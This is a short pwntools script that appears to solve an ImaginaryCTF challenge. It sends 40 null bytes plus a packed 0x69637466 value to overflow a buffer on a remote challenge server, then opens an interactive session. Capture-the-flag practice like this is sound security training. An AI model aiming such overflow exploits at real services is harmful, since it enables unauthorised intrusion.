from pwn import *

io = remote('chal.imaginaryctf.org', '42001')

payload = p32(0x69637466)

io.sendline(b'\x00'*40 + payload)
io.interactive()
